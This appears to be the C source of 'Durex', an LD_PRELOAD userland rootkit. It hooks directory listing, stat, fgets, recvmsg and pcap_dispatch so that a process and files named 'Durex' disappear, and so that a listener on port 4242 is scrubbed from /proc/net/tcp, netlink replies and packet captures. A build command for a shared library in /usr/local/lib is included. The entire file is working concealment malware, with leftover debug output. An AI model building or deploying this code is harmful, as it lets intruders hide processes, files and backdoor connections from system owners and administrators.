#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <arpa/inet.h>
#include <linux/inet_diag.h>
#include <pcap/pcap.h>
#include <netinet/ip.h>
#include <linux/tcp.h>

static const char	*process_to_filter = "Durex";

static int			get_dir_name(DIR *dirp, char *buf, size_t size)
{
	int				fd;
	char			tmp[64];
	ssize_t			ret;

	fd = dirfd(dirp);
	if (fd < 0)
		return 0;
	snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
	ret = readlink(tmp, buf, size);
	if (ret < 0)
		return 0;
	buf[ret] = 0;
	return 1;
}

static int			get_process_name(char *pid, char *buf)
{
	char			tmp[256];
	FILE			*f;
	int				unused;

	if (strspn(pid, "0123456789") != strlen(pid))
		return 0;
	snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
	f = fopen(tmp, "r");
	if (f == NULL)
		return 0;
	if (fgets(tmp, sizeof(tmp), f) == NULL) {
		fclose(f);
		return 0;
	}
	fclose(f);
	sscanf(tmp, "%d (%[^)]s", &unused, buf);
	return 1;
}

#define DECLARE_READDIR(dirent, readdir)							\
static struct dirent	*(*original_##readdir)(DIR *) = NULL;		\
struct dirent		*readdir(DIR *dirp)								\
{																	\
	if (original_##readdir == NULL) {								\
		original_##readdir = dlsym(RTLD_NEXT, "readdir");			\
		if (original_##readdir == NULL) {							\
			fprintf(stderr, "Error in dlsym: %s\n", dlerror());		\
			return NULL;											\
		}															\
	}																\
																	\
	struct dirent	*dir;											\
																	\
	while (1) {														\
		dir = original_##readdir(dirp);								\
		if (dir) {													\
			char	dir_name[256];									\
			char	process_name[256];								\
																	\
			if (get_dir_name(dirp, dir_name, sizeof(dir_name))) {		\
				if (strcmp(dir_name, "/proc") == 0) {					\
					if (get_process_name(dir->d_name, process_name)) {	\
						if (strcmp(process_name, process_to_filter) == 0) \
							continue ;									\
					}													\
				}														\
			}															\
			if (strstr(dir->d_name, process_to_filter))					\
				continue ;												\
		}																\
		break ;															\
	}																	\
	return dir;															\
}

DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);

#define DECLARE_XSTAT(xstat, stat)										\
	static int (*original_##xstat)(int, const char *, struct stat *) = NULL; \
	int xstat(int ver, const char *pathname, struct stat *buf)			\
	{																	\
		if (original_##xstat == NULL) {									\
			original_##xstat = dlsym(RTLD_NEXT, "__xstat");				\
			if (original_##xstat == NULL) {								\
				fprintf(stderr, "Error in dlsym: %s\n", dlerror());		\
				return -1;												\
			}															\
		}																\
																		\
		if (strstr(pathname, process_to_filter)) {						\
			errno = ENOENT;												\
			return -1;													\
		}																\
		return original_##xstat(ver, pathname, buf);					\
	}

DECLARE_XSTAT(__xstat64, stat64);
DECLARE_XSTAT(__xstat, stat);


#define DECLARE_LXSTAT(xstat, stat)										\
	static int (*original_##xstat)(int, const char *, struct stat *) = NULL; \
	int xstat(int ver, const char *pathname, struct stat *buf)			\
	{																	\
		if (original_##xstat == NULL) {									\
			original_##xstat = dlsym(RTLD_NEXT, "__lxstat");			\
			if (original_##xstat == NULL) {								\
				fprintf(stderr, "Error in dlsym: %s\n", dlerror());		\
				return -1;												\
			}															\
		}																\
																		\
		if (strstr(pathname, process_to_filter)) {						\
			errno = ENOENT;												\
			return -1;													\
		}																\
		return original_##xstat(ver, pathname, buf);					\
	}

DECLARE_LXSTAT(__lxstat64, stat64);
DECLARE_LXSTAT(__lxstat, stat);

static int			get_file_name(FILE *f, char *buf, size_t size)
{
	int				fd;
	char			tmp[64];
	ssize_t			ret;

	fd = fileno(f);
	if (fd < 0)
		return 0;
	snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
	ret = readlink(tmp, buf, size);
	if (ret < 0)
		return 0;
	buf[ret] = 0;
	return 1;
}

#define DECLARE_FGETS()													\
	static char *(*original_##fgets)(char *s, int size, FILE *stream) = NULL; \
	char *fgets(char *s, int size, FILE *stream) {						\
		if (original_##fgets == NULL) {									\
			original_##fgets = dlsym(RTLD_NEXT, "fgets");				\
			if (original_##fgets == NULL) {								\
				fprintf(stderr, "Error in dlsym: %s\n", dlerror());		\
				return NULL;											\
			}															\
		}																\
																		\
		char	*ret;													\
																		\
		while (1) {														\
			ret = original_##fgets(s, size, stream);					\
			if (ret) {													\
				char	file_name[256];									\
				if (get_file_name(stream, file_name, 256) &&			\
					strstr(file_name, "/proc/") &&						\
					strstr(file_name, "/net/tcp") &&					\
					strstr(ret, " 0100007F:1092 ")) {					\
					continue ;											\
				}														\
			}															\
			break ;														\
		}																\
		return ret;														\
	}

DECLARE_FGETS();

#define DECLARE_RECVMSG()												\
	static ssize_t (*original_##recvmsg)(int sockfd, struct msghdr *msg, int flags) = NULL; \
	ssize_t recvmsg(int sockfd, struct msghdr *msg, int flags) {		\
		if (original_##recvmsg == NULL) {								\
			original_##recvmsg = dlsym(RTLD_NEXT, "recvmsg");			\
			if (original_##recvmsg == NULL) {							\
				fprintf(stderr, "Error in dlsym: %s\n", dlerror());		\
				return -1;												\
			}															\
		}																\
																		\
		ssize_t		ret, ret2;											\
																		\
		ret = original_##recvmsg(sockfd, msg, flags);					\
		if (ret > 0) {													\
			ret2 = ret;													\
			printf("RECVMSG family:%d\n", ((struct sockaddr *)msg->msg_name)->sa_family); \
			if (((struct sockaddr *)msg->msg_name)->sa_family == AF_NETLINK) { \
				printf("NETLINK\n");\
				struct nlmsghdr *h = (struct nlmsghdr*)(msg->msg_iov->iov_base); \
				while (NLMSG_OK(h, ret2)) {								\
					if (h->nlmsg_type == NLMSG_DONE)					\
						break ;											\
					if (h->nlmsg_type == RTM_NEWADDR) {					\
						struct inet_diag_msg *r = NLMSG_DATA(h);		\
						if (ntohs(r->id.idiag_sport) == 4242)			\
							h->nlmsg_type = NLMSG_DONE;					\
					}													\
					h = NLMSG_NEXT(h, ret2);							\
				}														\
			}															\
		}																\
		return ret;														\
	}

DECLARE_RECVMSG();

static void (*original_callback)(u_char*, const struct pcap_pkthdr*, const u_char*) = NULL;

static void		pcap_dumper(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes)
{
	struct ip	*ip = (struct ip *)(bytes + 14);
	int			ipsize = (((ip)->ip_hl) & 0x0f) * 4;

	if (ipsize < 20)
		return ;
	if (ip->ip_p == IPPROTO_TCP) {
		struct tcphdr	*tcp = (struct tcphdr *)(bytes + 14 + ipsize);
		int				tcpsize = tcp->doff * 4;
		/* int				port = ntohs(tcp->dest); */

		if (tcpsize < 20)
			return ;
		printf("src:\e[31m%u\e[0m dest:\e[32m%u\e[0m seq:%u ack_seq:%u\n"
			   "res1:%u doff:%u fin:%u syn:%u rst:%u psh:%u ack:%u urg:%u ece:%u cwr:%u\n",
			   ntohs(tcp->source), ntohs(tcp->dest),
			   ntohl(tcp->seq), ntohl(tcp->ack_seq),
			   tcp->res1, tcp->doff, tcp->fin, tcp->syn, tcp->rst, tcp->psh, tcp->ack, tcp->urg, tcp->ece, tcp->cwr);
		if (ntohs(tcp->source) == 4242) {
			tcp->syn = 0;
			tcp->rst = 1;
		}
		original_callback(user, h, bytes);
	}
}

#define DECLARE_PCAP_DISPATCH()											\
	static int (*original_##pcap_dispatch)(pcap_t *, int, pcap_handler, u_char *) = NULL; \
	int pcap_dispatch(pcap_t *p, int cnt, pcap_handler callback, u_char *user) { \
		if (original_##pcap_dispatch == NULL) {							\
			original_##pcap_dispatch = dlsym(RTLD_NEXT, "pcap_dispatch"); \
			if (original_##pcap_dispatch == NULL) {						\
				fprintf(stderr, "Error in dlsym: %s\n", dlerror());		\
				return -1;												\
			}															\
		}																\
																		\
		original_callback = callback;									\
		return original_##pcap_dispatch(p, cnt, pcap_dumper, user);		\
	}

DECLARE_PCAP_DISPATCH();

/*
Compilation status 
gcc -Wall -fPIC -shared -o /usr/local/lib/Durex.so srcs/processhider.c -ldl
*/
